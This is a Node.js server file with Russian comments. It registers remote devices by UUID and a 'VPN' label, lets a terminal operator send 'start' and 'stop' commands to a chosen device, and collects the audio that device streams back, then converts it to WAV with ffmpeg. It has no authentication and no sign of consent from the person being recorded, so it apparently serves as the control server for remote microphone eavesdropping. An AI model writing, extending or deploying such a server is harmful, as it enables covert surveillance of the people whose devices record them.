const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

let clients = {}; // Объект для хранения информации о клиентах и их VPN
let audioChunks = {}; // Объект для хранения аудиоданных по каждому клиенту

// Обработка подключения клиента.
io.on('connection', (socket) => {
    console.log(`Client connected: ${socket.id}`);

    // Получаем UUID от клиента.
    socket.on('register', (uuid) => {
        clients[uuid] = { socketId: socket.id, vpn: null }; // Инициализируем с VPN как null
        audioChunks[uuid] = []; // Инициализируем массив аудиоданных для клиента
        console.log(`Device registered with UUID: ${uuid}`);
    });

    // Обработка получения VPN.
    socket.on('vpn', (vpn) => {
        const client = Object.values(clients).find(client => client.socketId === socket.id);
        if (client) {
            client.vpn = vpn; // Сохраняем VPN для соответствующего клиента
            console.log(`Received VPN from client ${socket.id}: ${vpn}`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`Client disconnected: ${socket.id}`);
        // Удаляем клиента из списка при отключении
        for (let uuid in clients) {
            if (clients[uuid].socketId === socket.id) {
                delete clients[uuid];
                delete audioChunks[uuid]; // Удаляем аудиоданные клиента
                break;
            }
        }
    });

    socket.on('audio', (data) => {
        const client = Object.values(clients).find(client => client.socketId === socket.id);
        if (client) {
            audioChunks[client.vpn] = audioChunks[client.vpn] || []; // Инициализируем массив, если его нет
            audioChunks[client.vpn].push(data); // Сохраняем данные в массив конкретного клиента.
        }
    });
});

// Запуск сервера на порту 47696.
server.listen(47696, '0.0.0.0', () => {
    console.log('Server is running on http://0.0.0.0:47696');
});

// Создаем интерфейс для чтения команд из терминала.
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

// Обработка ввода команд в терминале.
rl.on('line', (input) => {
    const [command, vpn] = input.trim().split(' '); // Разделяем команду и аргумент

    if (command === 'start' && vpn) {
        console.log(`Start command issued for VPN: ${vpn}`);
        
        // Очищаем массив при старте.
        audioChunks[vpn] = []; 

        // Находим клиента с указанным VPN и отправляем ему команду start
        for (let uuid in clients) {
            if (clients[uuid].vpn === vpn) {
                io.to(clients[uuid].socketId).emit('start', vpn);
                break; // Выходим из цикла после нахождения клиента
            }
        }
    }

    if (command === 'stop' && vpn) {
        console.log(`Stop command issued for VPN: ${vpn}`);
        
        // Находим клиента с указанным VPN и отправляем ему команду stop
        for (let uuid in clients) {
            if (clients[uuid].vpn === vpn) {
                io.to(clients[uuid].socketId).emit('stop');
                break; // Выходим из цикла после нахождения клиента
            }
        }

        const tempAudioFilePath = `uploads/audio_${Date.now()}.pcm`;
        
        const audioBuffer = Buffer.concat(audioChunks[vpn] || []);
        fs.writeFileSync(tempAudioFilePath, audioBuffer);

        const wavFilePath = tempAudioFilePath.replace('.pcm', '.wav');
        exec(`ffmpeg -f s16le -ar 44100 -ac 1 -i ${tempAudioFilePath} ${wavFilePath}`, (error) => {
            if (error) console.error(`Error converting file to WAV: ${error.message}`);
            else console.log(`Converted ${tempAudioFilePath} to ${wavFilePath}`);
            fs.unlinkSync(tempAudioFilePath); // Удаляем временный PCM файл.
        });

        delete audioChunks[vpn]; // Удаляем массив аудиоданных после записи.
    }
});
